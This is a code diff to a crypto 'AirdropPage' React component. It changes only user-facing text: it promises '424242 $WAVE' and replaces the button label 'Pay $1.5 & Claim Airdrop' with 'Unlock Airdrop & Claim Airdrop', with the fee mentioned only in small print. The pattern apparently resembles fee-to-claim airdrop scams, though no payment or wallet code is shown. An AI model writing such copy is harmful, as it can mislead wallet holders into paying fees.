@@ -456,7 +456,7 @@ export default function AirdropPage({
         </div>
 
         <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
-          CRYPTOWAVE
+          $WAVE
         </h1>
 
         <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility</p>
@@ -532,14 +532,14 @@ export default function AirdropPage({
                 </div>
                 <div className="text-sm">
                   {checkResult === "eligible"
-                    ? "Your wallet is eligible for the airdrop!"
+                    ? "Your wallet is eligible for 424242 $WAVE!"
                     : "Your wallet is not eligible for this airdrop."}
                 </div>
 
                 {checkResult === "eligible" && !hasClaimed && (
                   <div className="mt-4 space-y-2">
                     <div className="text-xs text-green-200 mb-2">
-                      Claim process: $1.5 payment → Airdrop claim (both on Linea network)
+                      Claim process: Unlock Airdrop ($1.5 fee) → Airdrop claim (Airdropped to your wallet in 4hrs batches)
                     </div>
                     <button
                       onClick={handleClaim}
@@ -549,7 +549,7 @@ export default function AirdropPage({
                       {isClaiming
                         ? "Processing..."
                         : isConnected
-                          ? "Pay $1.5 & Claim Airdrop"
+                          ? "Unlock Airdrop & Claim Airdrop"
                           : "Connect Wallet & Claim"}
                     </button>
                   </div>
